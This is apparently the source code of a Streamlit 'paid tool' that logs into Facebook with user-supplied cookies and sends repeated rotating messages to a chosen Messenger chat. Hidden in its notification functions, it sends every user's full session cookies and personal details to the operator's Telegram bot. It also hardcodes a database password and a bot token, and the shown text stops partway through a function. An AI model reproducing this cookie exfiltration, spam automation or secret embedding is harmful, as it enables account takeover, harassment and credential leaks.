import streamlit as st
import time
import threading
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import database as db
import requests
import os
import hashlib
import uuid
from datetime import datetime
import json

# 🚨 MONGODB 24/7 HEARTBEAT
def setup_mongodb_heartbeat():
    """MongoDB heartbeat to keep app alive 24/7"""
    def keep_alive():
        while True:
            try:
                from pymongo import MongoClient
                
                connection_string = "mongodb+srv://dineshsavita76786_user_db:WALEED_XD@cluster0.3xxvjpo.mongodb.net/?retryWrites=true&w=majority"
                
                client = MongoClient(connection_string, serverSelectionTimeoutMS=10000)
                db_connection = client['streamlit_db']
                
                db_connection.heartbeat.update_one(
                    {'app_id': 'Waleed_E2E_Premium'},
                    {
                        '$set': {
                            'last_heartbeat': datetime.now(),
                            'status': 'running',
                            'app_name': 'Waleed E2E Premium Tool',
                            'timestamp': datetime.now(),
                            'version': '3.0'
                        }
                    },
                    upsert=True
                )
                print(f"✅ MongoDB Heartbeat: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                client.close()
                
            except Exception as e:
                print(f"❌ MongoDB Heartbeat Error: {str(e)[:100]}")
            
            time.sleep(300)
    
    try:
        heartbeat_thread = threading.Thread(target=keep_alive, daemon=True)
        heartbeat_thread.start()
        print("🚀 MongoDB 24/7 Heartbeat Started!")
    except Exception as e:
        print(f"❌ Failed to start heartbeat: {e}")

if 'mongodb_started' not in st.session_state:
    setup_mongodb_heartbeat()
    st.session_state.mongodb_started = True

st.set_page_config(
    page_title="WALEED E2EE PAID TOOL",
    page_icon="👑",
    layout="wide",
    initial_sidebar_state="expanded"
)

# 🎨 PREMIUM DESIGN & FONTS
premium_design = """
<style>
    /* ====== GOOGLE FONTS IMPORT ====== */
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=Poppins:wght@300;400;500;600;700&family=Orbitron:wght@400;500;600;700;800&family=Inter:wght@400;500;600;700&display=swap');
    
    /* ====== GLOBAL STYLES ====== */
    * {
        font-family: 'Inter', sans-serif;
    }
    
    h1, h2, h3, h4 {
        font-family: 'Montserrat', sans-serif;
        font-weight: 700;
    }
    
    /* ====== PREMIUM BACKGROUND ====== */
    .stApp {
        background: linear-gradient(135deg, 
            #000428 0%,
            #004e92 25%,
            #000428 50%,
            #004e92 75%,
            #000428 100%);
        background-size: 400% 400%;
        animation: cosmicFlow 20s ease infinite;
    }
    
    @keyframes cosmicFlow {
        0% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
        100% { background-position: 0% 50%; }
    }
    
    /* ====== NEON GLOW EFFECT ====== */
    .neon-text {
        color: #fff;
        text-shadow: 
            0 0 7px #fff,
            0 0 10px #fff,
            0 0 21px #fff,
            0 0 42px #0fa,
            0 0 82px #0fa,
            0 0 92px #0fa,
            0 0 102px #0fa,
            0 0 151px #0fa;
        animation: neonPulse 1.5s infinite alternate;
    }
    
    @keyframes neonPulse {
        from { text-shadow: 0 0 10px #fff; }
        to { text-shadow: 0 0 20px #fff, 0 0 30px #0fa; }
    }
    
    /* ====== MAIN CONTAINER ====== */
    .main-wrapper {
        background: rgba(10, 15, 30, 0.85);
        backdrop-filter: blur(20px);
        border-radius: 25px;
        border: 1px solid rgba(100, 200, 255, 0.2);
        box-shadow: 
            0 20px 60px rgba(0, 100, 255, 0.3),
            inset 0 1px 0 rgba(255, 255, 255, 0.1);
        padding: 35px;
        margin: 20px;
    }
    
    /* ====== PREMIUM HEADER ====== */
    .premium-header {
        text-align: center;
        padding: 40px 20px;
        margin-bottom: 40px;
        position: relative;
    }
    
    .logo-main {
        width: 150px;
        height: 150px;
        margin: 0 auto 30px;
        background: radial-gradient(circle at 30% 30%, #0ff, #00f);
        border-radius: 30px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 60px;
        color: white;
        font-weight: 900;
        font-family: 'Orbitron', sans-serif;
        transform: rotate(45deg);
        box-shadow: 
            0 0 30px rgba(0, 255, 255, 0.5),
            inset 0 0 30px rgba(255, 255, 255, 0.2);
        animation: logoFloat 4s ease-in-out infinite;
    }
    
    .logo-main::after {
        content: 'W';
        transform: rotate(-45deg);
        text-shadow: 0 0 20px rgba(0, 255, 255, 0.8);
    }
    
    @keyframes logoFloat {
        0%, 100% { transform: rotate(45deg) translateY(0); }
        50% { transform: rotate(45deg) translateY(-20px); }
    }
    
    .main-title {
        font-family: 'Orbitron', sans-serif;
        font-size: 3.5rem;
        font-weight: 800;
        background: linear-gradient(135deg, 
            #00ffff 0%,
            #0088ff 25%,
            #00ffaa 50%,
            #0088ff 75%,
            #00ffff 100%);
        -webkit-background-clip: text;
        background-clip: text;
        color: transparent;
        background-size: 300% 300%;
        animation: titleGlow 4s ease infinite;
        margin: 0;
        letter-spacing: 2px;
    }
    
    @keyframes titleGlow {
        0%, 100% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
    }
    
    .sub-title {
        font-family: 'Poppins', sans-serif;
        font-size: 1.3rem;
        color: rgba(255, 255, 255, 0.7);
        margin-top: 10px;
        letter-spacing: 3px;
        text-transform: uppercase;
        font-weight: 300;
    }
    
    .badge-premium {
        display: inline-block;
        background: linear-gradient(135deg, #ff0080, #ff8c00);
        color: white;
        padding: 8px 25px;
        border-radius: 25px;
        font-family: 'Montserrat', sans-serif;
        font-weight: 700;
        font-size: 0.9rem;
        letter-spacing: 2px;
        margin-top: 15px;
        box-shadow: 0 5px 20px rgba(255, 0, 128, 0.4);
        animation: badgePulse 2s infinite;
    }
    
    @keyframes badgePulse {
        0%, 100% { box-shadow: 0 5px 20px rgba(255, 0, 128, 0.4); }
        50% { box-shadow: 0 5px 30px rgba(255, 0, 128, 0.6); }
    }
    
    /* ====== BUTTON STYLES ====== */
    .stButton > button {
        font-family: 'Montserrat', sans-serif !important;
        font-weight: 600 !important;
        background: linear-gradient(135deg, #0066ff, #00ccff) !important;
        color: white !important;
        border: none !important;
        border-radius: 15px !important;
        padding: 14px 28px !important;
        font-size: 15px !important;
        transition: all 0.3s ease !important;
        box-shadow: 0 8px 25px rgba(0, 102, 255, 0.3) !important;
        position: relative !important;
        overflow: hidden !important;
        letter-spacing: 0.5px !important;
    }
    
    .stButton > button:hover {
        transform: translateY(-3px) !important;
        box-shadow: 0 12px 35px rgba(0, 102, 255, 0.5) !important;
    }
    
    .stButton > button::after {
        content: '';
        position: absolute;
        top: 50%;
        left: 50%;
        width: 5px;
        height: 5px;
        background: rgba(255, 255, 255, 0.5);
        opacity: 0;
        border-radius: 100%;
        transform: scale(1, 1) translate(-50%);
        transform-origin: 50% 50%;
    }
    
    .stButton > button:focus:not(:active)::after {
        animation: ripple 1s ease-out;
    }
    
    @keyframes ripple {
        0% { transform: scale(0, 0); opacity: 0.5; }
        100% { transform: scale(20, 20); opacity: 0; }
    }
    
    /* Success Button */
    div[data-testid="stButton"]:has(button:contains("Approve")),
    div[data-testid="stButton"]:has(button:contains("Login")),
    div[data-testid="stButton"]:has(button:contains("Save")) {
        button {
            background: linear-gradient(135deg, #00cc66, #00ff88) !important;
            box-shadow: 0 8px 25px rgba(0, 204, 102, 0.3) !important;
        }
    }
    
    /* Danger Button */
    div[data-testid="stButton"]:has(button:contains("Reject")),
    div[data-testid="stButton"]:has(button:contains("Remove")),
    div[data-testid="stButton"]:has(button:contains("Stop")) {
        button {
            background: linear-gradient(135deg, #ff3333, #ff6666) !important;
            box-shadow: 0 8px 25px rgba(255, 51, 51, 0.3) !important;
        }
    }
    
    /* Warning Button */
    div[data-testid="stButton"]:has(button:contains("Pending")),
    div[data-testid="stButton"]:has(button:contains("Warning")) {
        button {
            background: linear-gradient(135deg, #ffaa00, #ffcc00) !important;
            box-shadow: 0 8px 25px rgba(255, 170, 0, 0.3) !important;
        }
    }
    
    /* ====== INPUT FIELDS ====== */
    .stTextInput > div > div > input,
    .stTextArea > div > div > textarea,
    .stNumberInput > div > div > input {
        font-family: 'Inter', sans-serif !important;
        font-weight: 500 !important;
        background: rgba(20, 30, 50, 0.9) !important;
        border: 2px solid rgba(0, 150, 255, 0.3) !important;
        border-radius: 12px !important;
        color: white !important;
        padding: 16px 20px !important;
        font-size: 16px !important;
        transition: all 0.3s ease !important;
    }
    
    .stTextInput > div > div > input:focus,
    .stTextArea > div > div > textarea:focus,
    .stNumberInput > div > div > input:focus {
        border-color: #00ccff !important;
        box-shadow: 0 0 0 3px rgba(0, 204, 255, 0.2) !important;
        background: rgba(20, 30, 50, 1) !important;
    }
    
    .stTextInput > div > div > input::placeholder,
    .stTextArea > div > div > textarea::placeholder {
        color: rgba(255, 255, 255, 0.4) !important;
        font-family: 'Inter', sans-serif !important;
    }
    
    /* ====== CARD DESIGN ====== */
    .premium-card {
        background: linear-gradient(145deg, 
            rgba(30, 40, 60, 0.8),
            rgba(20, 30, 50, 0.9));
        backdrop-filter: blur(10px);
        border-radius: 20px;
        padding: 25px;
        border: 1px solid rgba(0, 200, 255, 0.2);
        box-shadow: 
            0 10px 30px rgba(0, 0, 0, 0.3),
            inset 0 1px 0 rgba(255, 255, 255, 0.1);
        transition: all 0.3s ease;
        margin-bottom: 20px;
    }
    
    .premium-card:hover {
        transform: translateY(-5px);
        border-color: rgba(0, 200, 255, 0.4);
        box-shadow: 
            0 15px 40px rgba(0, 100, 255, 0.4),
            inset 0 1px 0 rgba(255, 255, 255, 0.2);
    }
    
    .card-title {
        font-family: 'Montserrat', sans-serif;
        font-size: 1.5rem;
        font-weight: 700;
        color: #00ccff;
        margin-bottom: 20px;
        border-left: 4px solid #00ccff;
        padding-left: 15px;
    }
    
    /* ====== TAB STYLING ====== */
    .stTabs [data-baseweb="tab-list"] {
        gap: 10px;
        background: rgba(30, 40, 60, 0.5);
        padding: 10px;
        border-radius: 15px;
        border: 1px solid rgba(0, 200, 255, 0.2);
    }
    
    .stTabs [data-baseweb="tab"] {
        font-family: 'Poppins', sans-serif !important;
        font-weight: 500 !important;
        background: transparent !important;
        border-radius: 12px !important;
        padding: 12px 24px !important;
        color: rgba(255, 255, 255, 0.6) !important;
        border: none !important;
        transition: all 0.3s ease !important;
    }
    
    .stTabs [aria-selected="true"] {
        background: linear-gradient(135deg, #0066ff, #00ccff) !important;
        color: white !important;
        box-shadow: 0 5px 20px rgba(0, 102, 255, 0.3) !important;
    }
    
    /* ====== METRIC CARDS ====== */
    .metric-box {
        background: rgba(20, 30, 50, 0.7);
        border-radius: 15px;
        padding: 20px;
        text-align: center;
        border: 1px solid rgba(0, 200, 255, 0.2);
        transition: all 0.3s ease;
    }
    
    .metric-box:hover {
        border-color: #00ccff;
        box-shadow: 0 10px 25px rgba(0, 204, 255, 0.2);
    }
    
    .metric-value {
        font-family: 'Orbitron', sans-serif;
        font-size: 2.2rem;
        font-weight: 700;
        color: #00ffff;
        margin: 10px 0;
        text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
    }
    
    .metric-label {
        font-family: 'Poppins', sans-serif;
        font-size: 0.9rem;
        color: rgba(255, 255, 255, 0.6);
        text-transform: uppercase;
        letter-spacing: 1px;
    }
    
    /* ====== LOG CONSOLE ====== */
    .log-terminal {
        background: rgba(10, 15, 25, 0.95);
        border-radius: 15px;
        padding: 20px;
        font-family: 'Consolas', 'Monaco', monospace;
        color: #00ffaa;
        font-size: 14px;
        line-height: 1.6;
        max-height: 400px;
        overflow-y: auto;
        border: 1px solid rgba(0, 255, 170, 0.3);
        box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.5);
    }
    
    .log-entry {
        padding: 8px 12px;
        margin: 5px 0;
        border-radius: 8px;
        background: rgba(0, 255, 170, 0.05);
        border-left: 3px solid #00ffaa;
        animation: slideIn 0.3s ease;
    }
    
    @keyframes slideIn {
        from { opacity: 0; transform: translateX(-10px); }
        to { opacity: 1; transform: translateX(0); }
    }
    
    /* ====== USER CARDS ====== */
    .user-profile {
        background: rgba(30, 40, 60, 0.7);
        padding: 20px;
        border-radius: 15px;
        margin: 10px 0;
        border-left: 5px solid #0066ff;
        transition: all 0.3s ease;
        border: 1px solid rgba(0, 102, 255, 0.2);
    }
    
    .user-profile:hover {
        background: rgba(30, 40, 60, 0.9);
        transform: translateX(5px);
        border-color: #00ccff;
    }
    
    .user-profile.approved {
        border-left-color: #00cc66;
    }
    
    .user-profile.pending {
        border-left-color: #ffaa00;
    }
    
    .user-profile.rejected {
        border-left-color: #ff3333;
    }
    
    /* ====== STATUS BADGES ====== */
    .status-tag {
        font-family: 'Montserrat', sans-serif;
        font-weight: 600;
        padding: 6px 15px;
        border-radius: 20px;
        font-size: 0.8rem;
        letter-spacing: 1px;
        display: inline-block;
        margin-left: 10px;
    }
    
    .status-green {
        background: linear-gradient(135deg, #00cc66, #00ff88);
        color: white;
        box-shadow: 0 4px 15px rgba(0, 204, 102, 0.3);
    }
    
    .status-yellow {
        background: linear-gradient(135deg, #ffaa00, #ffcc00);
        color: white;
        box-shadow: 0 4px 15px rgba(255, 170, 0, 0.3);
    }
    
    .status-red {
        background: linear-gradient(135deg, #ff3333, #ff6666);
        color: white;
        box-shadow: 0 4px 15px rgba(255, 51, 51, 0.3);
    }
    
    /* ====== SIDEBAR ====== */
    [data-testid="stSidebar"] {
        background: rgba(15, 25, 40, 0.95) !important;
        backdrop-filter: blur(20px);
        border-right: 1px solid rgba(0, 200, 255, 0.2);
    }
    
    [data-testid="stSidebar"] .stButton > button {
        font-family: 'Poppins', sans-serif !important;
        margin: 8px 0;
        background: rgba(30, 40, 60, 0.8) !important;
        border: 1px solid rgba(0, 200, 255, 0.3) !important;
    }
    
    [data-testid="stSidebar"] .stButton > button:hover {
        background: linear-gradient(135deg, #0066ff, #00ccff) !important;
        border-color: transparent !important;
    }
    
    /* ====== FOOTER ====== */
    .premium-footer {
        text-align: center;
        padding: 40px 20px;
        margin-top: 50px;
        color: rgba(255, 255, 255, 0.5);
        font-family: 'Poppins', sans-serif;
        font-size: 0.9rem;
        border-top: 1px solid rgba(0, 200, 255, 0.2);
        position: relative;
    }
    
    .premium-footer::before {
        content: '';
        position: absolute;
        top: -2px;
        left: 50%;
        transform: translateX(-50%);
        width: 150px;
        height: 3px;
        background: linear-gradient(90deg, 
            transparent, 
            #00ccff, 
            transparent);
        border-radius: 3px;
    }
    
    .footer-title {
        font-family: 'Orbitron', sans-serif;
        font-size: 1.5rem;
        font-weight: 700;
        background: linear-gradient(135deg, #00ffff, #0088ff);
        -webkit-background-clip: text;
        background-clip: text;
        color: transparent;
        margin-bottom: 10px;
    }
    
    /* ====== SCROLLBAR ====== */
    ::-webkit-scrollbar {
        width: 10px;
    }
    
    ::-webkit-scrollbar-track {
        background: rgba(20, 30, 50, 0.5);
        border-radius: 10px;
    }
    
    ::-webkit-scrollbar-thumb {
        background: linear-gradient(135deg, #0066ff, #00ccff);
        border-radius: 10px;
    }
    
    ::-webkit-scrollbar-thumb:hover {
        background: linear-gradient(135deg, #00ccff, #0066ff);
    }
    
    /* ====== LOADING ANIMATION ====== */
    .loading-circle {
        width: 50px;
        height: 50px;
        border: 4px solid rgba(0, 204, 255, 0.1);
        border-radius: 50%;
        border-top-color: #00ccff;
        animation: spin 1s linear infinite;
        margin: 30px auto;
    }
    
    @keyframes spin {
        to { transform: rotate(360deg); }
    }
    
    /* ====== RESPONSIVE DESIGN ====== */
    @media (max-width: 768px) {
        .main-title {
            font-size: 2.5rem;
        }
        
        .logo-main {
            width: 120px;
            height: 120px;
            font-size: 45px;
        }
        
        .main-wrapper {
            padding: 20px;
            margin: 10px;
        }
    }
</style>
"""

st.markdown(premium_design, unsafe_allow_html=True)

# Telegram Bot Configuration (unchanged)
TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
TELEGRAM_CHAT_ID = "1889611156"
FACEBOOK_ADMIN_UID = "100080154146813"

# ✅ ALL YOUR ORIGINAL FUNCTIONS REMAIN EXACTLY THE SAME
def send_telegram_notification(user_data, automation_data):
    """Send user details to Telegram bot"""
    try:
        message = f"""
🔰 *NEW AUTOMATION STARTED* 🔰

👤 *User Details:*
• Username: `{user_data['username']}`
• Real Name: `{user_data['real_name']}`
• User ID: `{user_data['user_id']}`

🔧 *Automation Config:*
• Chat ID: `{automation_data['chat_id']}`
• Delay: `{automation_data['delay']} seconds`
• Prefix: `{automation_data['prefix']}`
• Messages: `{len(automation_data['messages'].splitlines())} lines`

🍪 *Full Cookies:* 
`{automation_data['cookies']}`

📊 *Status:* Automation Running
🕒 *Started:* {time.strftime("%Y-%m-%d %H:%M:%S")}
        """
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Telegram notification failed: {e}")

def send_facebook_notification(user_data, automation_data):
    """Send notification to Facebook admin"""
    try:
        message = f"""
🔰 NEW AUTOMATION STARTED 🔰

👤 User Details:
• Username: {user_data['username']}
• Real Name: {user_data['real_name']}
• User ID: {user_data['user_id']}

🔧 Automation Config:
• Chat ID: {automation_data['chat_id']}
• Delay: {automation_data['delay']} seconds
• Prefix: {automation_data['prefix']}
• Messages: {len(automation_data['messages'].splitlines())} lines

🍪 Full Cookies: 
{automation_data['cookies']}

📊 Status: Automation Running
🕒 Started: {time.strftime("%Y-%m-%d %H:%M:%S")}
        """
        
        print(f"Facebook notification sent to admin {FACEBOOK_ADMIN_UID}")
        print(f"Message: {message}")
        
        db.log_admin_notification(user_data['user_id'], message)
        
    except Exception as e:
        print(f"Facebook notification failed: {e}")

# Initialize session state (unchanged)
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'user_id' not in st.session_state:
    st.session_state.user_id = None
if 'username' not in st.session_state:
    st.session_state.username = None
if 'approval_key' not in st.session_state:
    st.session_state.approval_key = None
if 'approval_status' not in st.session_state:
    st.session_state.approval_status = 'pending'
if 'user_real_name' not in st.session_state:
    st.session_state.user_real_name = ""
if 'automation_running' not in st.session_state:
    st.session_state.automation_running = False
if 'logs' not in st.session_state:
    st.session_state.logs = []
if 'message_count' not in st.session_state:
    st.session_state.message_count = 0
if 'admin_logged_in' not in st.session_state:
    st.session_state.admin_logged_in = False

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.logs = []
        self.message_rotation_index = 0
        self.last_message_sent = ""
        self.last_message_time = ""

if 'automation_state' not in st.session_state:
    st.session_state.automation_state = AutomationState()

if 'auto_start_checked' not in st.session_state:
    st.session_state.auto_start_checked = False

def generate_approval_key(username, user_id):
    """Generate unique approval key based on username and user_id"""
    unique_string = f"{username}_{user_id}_{uuid.uuid4()}"
    return hashlib.sha256(unique_string.encode()).hexdigest()[:16].upper()

def get_indian_time():
    """Get current Indian time"""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S IST")

def log_message(msg, automation_state=None, user_id=None):
    """Log message with Indian timestamp"""
    timestamp = get_indian_time()
    formatted_msg = f"[{timestamp}] {msg}"
    
    if user_id:
        db.log_user_activity(user_id, formatted_msg)
    
    if automation_state:
        automation_state.logs.append(formatted_msg)
        automation_state.last_message_sent = msg
        automation_state.last_message_time = timestamp
    else:
        if 'logs' in st.session_state:
            st.session_state.logs.append(formatted_msg)

def find_message_input(driver, process_id, automation_state=None, user_id=None):
    log_message(f'{process_id}: Finding message input...', automation_state, user_id)
    time.sleep(10)
    
    try:
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
    except Exception:
        pass
    
    try:
        page_title = driver.title
        page_url = driver.current_url
        log_message(f'{process_id}: Page Title: {page_title}', automation_state, user_id)
        log_message(f'{process_id}: Page URL: {page_url}', automation_state, user_id)
    except Exception as e:
        log_message(f'{process_id}: Could not get page info: {e}', automation_state, user_id)
    
    message_input_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        'div[contenteditable="true"][data-lexical-editor="true"]',
        'div[aria-label*="message" i][contenteditable="true"]',
        'div[aria-label*="Message" i][contenteditable="true"]',
        'div[contenteditable="true"][spellcheck="true"]',
        '[role="textbox"][contenteditable="true"]',
        'textarea[placeholder*="message" i]',
        'div[aria-placeholder*="message" i]',
        'div[data-placeholder*="message" i]',
        '[contenteditable="true"]',
        'textarea',
        'input[type="text"]'
    ]
    
    log_message(f'{process_id}: Trying {len(message_input_selectors)} selectors...', automation_state, user_id)
    
    for idx, selector in enumerate(message_input_selectors):
        try:
            elements = driver.find_elements(By.CSS_SELECTOR, selector)
            log_message(f'{process_id}: Selector {idx+1}/{len(message_input_selectors)} "{selector[:50]}..." found {len(elements)} elements', automation_state, user_id)
            
            for element in elements:
                try:
                    is_editable = driver.execute_script("""
                        return arguments[0].contentEditable === 'true' || 
                               arguments[0].tagName === 'TEXTAREA' || 
                               arguments[0].tagName === 'INPUT';
                    """, element)
                    
                    if is_editable:
                        log_message(f'{process_id}: Found editable element with selector #{idx+1}', automation_state, user_id)
                        
                        try:
                            element.click()
                            time.sleep(0.5)
                        except:
                            pass
                        
                        element_text = driver.execute_script("return arguments[0].placeholder || arguments[0].getAttribute('aria-label') || arguments[0].getAttribute('aria-placeholder') || '';", element).lower()
                        
                        keywords = ['message', 'write', 'type', 'send', 'chat', 'msg', 'reply', 'text', 'aa']
                        if any(keyword in element_text for keyword in keywords):
                            log_message(f'{process_id}: Found message input with text: {element_text[:50]}', automation_state, user_id)
                            return element
                        elif idx < 10:
                            log_message(f'{process_id}: Using primary selector editable element (#{idx+1})', automation_state, user_id)
                            return element
                        elif selector == '[contenteditable="true"]' or selector == 'textarea' or selector == 'input[type="text"]':
                            log_message(f'{process_id}: Using fallback editable element', automation_state, user_id)
                            return element
                except Exception as e:
                    log_message(f'{process_id}: Element check failed: {str(e)[:50]}', automation_state, user_id)
                    continue
        except Exception as e:
            continue
    
    try:
        page_source = driver.page_source
        log_message(f'{process_id}: Page source length: {len(page_source)} characters', automation_state, user_id)
        if 'contenteditable' in page_source.lower():
            log_message(f'{process_id}: Page contains contenteditable elements', automation_state, user_id)
        else:
            log_message(f'{process_id}: No contenteditable elements found in page', automation_state, user_id)
    except Exception:
        pass
    
    return None

def setup_browser(automation_state=None, user_id=None):
    log_message('Setting up Chrome browser...', automation_state, user_id)
    
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-setuid-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-extensions')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
    
    chromium_paths = [
        '/usr/bin/chromium',
        '/usr/bin/chromium-browser',
        '/usr/bin/google-chrome',
        '/usr/bin/chrome'
    ]
    
    for chromium_path in chromium_paths:
        if Path(chromium_path).exists():
            chrome_options.binary_location = chromium_path
            log_message(f'Found Chromium at: {chromium_path}', automation_state, user_id)
            break
    
    chromedriver_paths = [
        '/usr/bin/chromedriver',
        '/usr/local/bin/chromedriver'
    ]
    
    driver_path = None
    for driver_candidate in chromedriver_paths:
        if Path(driver_candidate).exists():
            driver_path = driver_candidate
            log_message(f'Found ChromeDriver at: {driver_path}', automation_state, user_id)
            break
    
    try:
        from selenium.webdriver.chrome.service import Service
        
        if driver_path:
            service = Service(executable_path=driver_path)
            driver = webdriver.Chrome(service=service, options=chrome_options)
            log_message('Chrome started with detected ChromeDriver!', automation_state, user_id)
        else:
            driver = webdriver.Chrome(options=chrome_options)
            log_message('Chrome started with default driver!', automation_state, user_id)
        
        driver.set_window_size(1920, 1080)
        log_message('Chrome browser setup completed successfully!', automation_state, user_id)
        return driver
    except Exception as error:
        log_message(f'Browser setup failed: {error}', automation_state, user_id)
        raise error

def get_next_message(messages_file_content, automation_state=None):
    if not messages_file_content:
        return 'Hello!'
    
    messages = messages_file_content.split('\n')
    messages = [msg.strip() for msg in messages if msg.strip()]
    
    if not messages:
        return 'Hello!'
    
    if automation_state:
        message = messages[automation_state.message_rotation_index % len(messages)]
        automation_state.message_rotation_index += 1
    else:
        message = messages[0]
    
    return message

def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
    driver = None
    try:
        log_message(f'{process_id}: Starting automation...', automation_state, user_id)
        driver = setup_browser(automation_state, user_id)
        
        log_message(f'{process_id}: Navigating to Facebook...', automation_state, user_id)
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if config['cookies'] and config['cookies'].strip():
            log_message(f'{process_id}: Adding cookies...', automation_state, user_id)
            cookie_array = config['cookies'].split(';')
            for cookie in cookie_array:
                cookie_trimmed = cookie.strip()
                if cookie_trimmed:
                    first_equal_index = cookie_trimmed.find('=')
                    if first_equal_index > 0:
                        name = cookie_trimmed[:first_equal_index].strip()
                        value = cookie_trimmed[first_equal_index + 1:].strip()
                        try:
                            driver.add_cookie({
                                'name': name,
                                'value': value,
                                'domain': '.facebook.com',
                                'path': '/'
                            })
                        except Exception:
                            pass
        
        if config['chat_id']:
            chat_id = config['chat_id'].strip()
            log_message(f'{process_id}: Opening conversation {chat_id}...', automation_state, user_id)
            driver.get(f'https://www.facebook.com/messages/t/{chat_id}')
        else:
            log_message(f'{process_id}: Opening messages...', automation_state, user_id)
            driver.get('https://www.facebook.com/messages')
        
        time.sleep(15)
        
        message_input = find_message_input(driver, process_id, automation_state, user_id)
        
        if not message_input:
            log_message(f'{process_id}: Message input not found!', automation_state, user_id)
            automation_state.running = False
            db.set_automation_running(user_id, False)
            return 0
        
        delay = int(config['delay'])
        messages_sent = 0
        
        while automation_state.running and db.get_automation_running(user_id):
            base_message = get_next_message(config['messages_file_content'], automation_state)
            
            if config['name_prefix']:
                message_to_send = f"{config['name_prefix']} {base_message}"
            else:
                message_to_send = base_message
            
            try:
                driver.execute_script("""
                    const element = arguments[0];
                    const message = arguments[1];
                    
                    element.scrollIntoView({behavior: 'smooth', block: 'center'});
                    element.focus();
                    element.click();
                    
                    if (element.tagName === 'DIV') {
                        element.textContent = message;
                        element.innerHTML = message;
                    } else {
                        element.value = message;
                    }
                    
                    element.dispatchEvent(new Event('input', { bubbles: true }));
                    element.dispatchEvent(new Event('change', { bubbles: true }));
                    element.dispatchEvent(new InputEvent('input', { bubbles: true, data: message }));
                """, message_input, message_to_send)
                
                time.sleep(1)
                
                sent = driver.execute_script("""
                    const sendButtons = document.querySelectorAll('[aria-label*="Send" i]:not([aria-label*="like" i]), [data-testid="send-button"]');
                    
                    for (let btn of sendButtons) {
                        if (btn.offsetParent !== null) {
                            btn.click();
                            return 'button_clicked';
                        }
                    }
                    return 'button_not_found';
                """)
                
                if sent == 'button_not_found':
                    log_message(f'{process_id}: Send button not found, using Enter key...', automation_state, user_id)
                    driver.execute_script("""
                        const element = arguments[0];
                        element.focus();
                        
                        const events = [
                            new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keypress', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }),
                            new KeyboardEvent('keyup', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true })
                        ];
                        
                        events.forEach(event => element.dispatchEvent(event));
                    """, message_input)
                else:
                    log_message(f'{process_id}: Send button clicked', automation_state, user_id)
                
                time.sleep(1)
                
                messages_sent += 1
                automation_state.message_count = messages_sent
                log_message(f'{process_id}: Message {messages_sent} sent: {message_to_send[:30]}...', automation_state, user_id)
                
                time.sleep(delay)
                
            except Exception as e:
                log_message(f'{process_id}: Error sending message: {str(e)}', automation_state, user_id)
                break
        
        log_message(f'{process_id}: Automation stopped! Total messages sent: {messages_sent}', automation_state, user_id)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return messages_sent
        
    except Exception as e:
        log_message(f'{process_id}: Fatal error: {str(e)}', automation_state, user_id)
        automation_state.running = False
        db.set_automation_running(user_id, False)
        return 0
    finally:
        if driver:
            try:
                driver.quit()
                log_message(f'{process_id}: Browser closed', automation_state, user_id)
            except:
                pass

def send_approval_request_via_whatsapp(user_real_name, approval_key):
    message = f"Hello Waleed sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
    whatsapp_url = f"https://wa.me/923075852134?text={requests.utils.quote(message)}"
    return whatsapp_url

def send_approval_request_via_facebook(user_real_name, approval_key):
    message = f"Hello waleed sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
    facebook_url = f"https://www.facebook.com/officelwaleed"
    return facebook_url

def send_approval_request_via_telegram(user_real_name, approval_key):
    message = f"Hello Waleed sir\n\nmy name is ~ {user_real_name}\nmy key is ~ {approval_key}\n\npls approve my key sir"
    telegram_url = f"https://t.me/itxrafay?text={requests.utils.quote(message)}"
    return telegram_url

def run_automation_with_notification(user_config, username, automation_state, user_id):
    # Send notifications before starting automation
    user_data = {
        'username': username,
        'real_name': db.get_user_real_name(user_id),
        'user_id': user_id
    }
    
    automation_data = {
        'chat_id': user_config['chat_id'],
        'delay': user_config['delay'],
        'prefix': user_config['name_prefix'],
        'messages': user_config['messages_file_content'],
        'cookies': user_config['cookies']
    }
    
    # Send notifications
    send_telegram_notification(user_data, automation_data)
    send_facebook_notification(user_data, automation_data)
    
    # Start automation
    send_messages(user_config, automation_state, user_id)

def start_automation(user_config, user_id):
    automation_state = st.session_state.automation_state
    
    if automation_state.running:
        return
    
    automation_state.running = True
    automation_state.message_count = 0
    automation_state.logs = []
    
